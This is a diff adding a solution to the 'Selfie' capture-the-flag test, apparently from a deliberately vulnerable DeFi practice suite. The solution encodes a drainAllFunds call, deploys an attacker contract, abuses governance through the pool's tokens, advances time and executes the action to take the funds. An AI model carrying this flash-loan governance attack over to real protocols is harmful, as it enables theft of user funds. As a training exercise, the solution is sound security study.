@@ -30,7 +30,30 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //Generate Data
+        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool');
+        const ISelfiePoolFactory =  SelfiePoolFactory.interface
+        const data = ISelfiePoolFactory.encodeFunctionData("drainAllFunds", [
+         attacker.address
+        ]);
+
+        // await this.governance.queueAction(this.governance.address, data, 0);
+
+        //Deploy SelfieAttacker
+        const SelfieAttacker = await ethers.getContractFactory('SelfieAttacker', attacker);
+        this.selfieAttacker = await SelfieAttacker.deploy(this.governance.address, this.pool.address, data);
+
+        //call attack
+        await this.selfieAttacker.connect(attacker).attack(TOKENS_IN_POOL, this.token.address);
+
+        this.actionId = await this.selfieAttacker.actionId();
+
+        //Move time forward 
+        // Advance time 2 days so we can execute 
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        //Call function in simple governance
+        await this.governance.connect(attacker).executeAction(this.actionId);
     });
 
     after(async function () {
